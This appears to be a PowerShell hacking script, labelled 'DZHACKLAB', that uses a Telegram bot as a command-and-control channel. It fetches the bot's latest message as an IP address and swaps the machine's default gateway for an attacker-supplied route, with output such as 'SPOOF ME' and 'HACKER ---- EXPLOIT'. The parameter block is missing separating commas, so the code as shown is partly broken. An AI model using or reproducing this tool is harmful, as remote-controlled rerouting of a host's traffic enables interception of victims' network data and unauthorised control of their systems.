  function Log-Message
{
    [CmdletBinding()]
    Param
    (
        [Parameter(Mandatory=$true, Position=0)]
        [string]$LogMessage
    )

    Write-Output (" [DZHACKLAB] - ELMO9AWIM {0} - {1}" -f (Get-Date), $LogMessage)
}

Log-Message " [*] START JOB ------------------- ELMO9AWIM "

Function C2-AUTO-GETAY-SPOOF{
  Param(
  [Parameter(Mandatory=$true,Position=0)] [String[]]$BId
  [Parameter(Mandatory=$true,Position=1)] [String[]]$BToken
  [Parameter(Mandatory=$true,Position=2)] [String[]]$FOLD
  [Parameter(Mandatory=$true,Position=3)] [String[]]$FNEW
  [Parameter(Mandatory=$true,Position=4)] [String[]]$FLOG

 
  )
  Write-Output "BOT ID: $BId || BOT TOKEN: $BToken"


  $MyToken = $BToken
  $ChatID = $BId
  $MyBotUpdates = Invoke-WebRequest -Uri "https://api.telegram.org/bot$($MyToken)/getUpdates"
  #Convert the result from json and put them in an array
  $jsonresult = [array]($MyBotUpdates | ConvertFrom-Json).result

  $LastMessage = ""
  Foreach ($Result in $jsonresult)  {
    If ($Result.message.chat.id -eq $ChatID)  {
      $LastMessage = $Result.message.text
    }
  }

  Log-Message " [*] START DOWNLOADING ------------------- ELMO9AWIM "

  Write-Host "RUN ME $LastMessage"

  $TELEIP = $LastMessage

  #variables
  $ipaddress= $TELEIP
  $index = get-netipaddress | where-object {$_.IPAddress -eq $ipaddress} | select -ExpandProperty InterfaceIndex
  $Log = $FLOG
  $gateway = get-netroute -DestinationPrefix '0.0.0.0/0' | select -ExpandProperty NextHop
  $oldroute = $FOLD
  $newroute = $FNEW
  $destination = '0.0.0.0/0'

  #Start Changing the Gateway if needed

  Function Swap-Gateway() {

    remove-netroute -interfaceindex $index -NextHop $oldroute -confirm:$false
    new-netroute -interfaceindex $index -NextHop $newroute -destinationprefix $destination -confirm:$false
    sleep 3

  }

  if ($gateway -eq $oldroute) {
    Write-Warning -Message "Gateway is set to $gateway and will be changed to $newroute"
    Swap-Gateway | Out-file $Log -Append

  } 
  elseif ($gateway -eq $newroute) {
    Write-Warning -Message "Gateway is already set to $newroute and needs no change"
  
  }

  

  Log-Message " [*] END JOB ------------------- ELMO9AWIM "
  
  Write-Host "SPOOF ME $TELEIP || $FOLD >>> $FNEW || LOG ON $FLOG HACKER ---------------- EXPLOIT ?.> "
  
  Log-Message " [*] END JOB ------------------- ELMO9AWIM "

}

  
  
# C2-AUTO-GETAY-SPOOF -BId "TELEGRAM ID" -BToken "TELEGRAM TOKEN" -FOLD "OLD ROUTE" -FNEW "NEW ROUTE" -FLOG "LOG SAVE .log" 
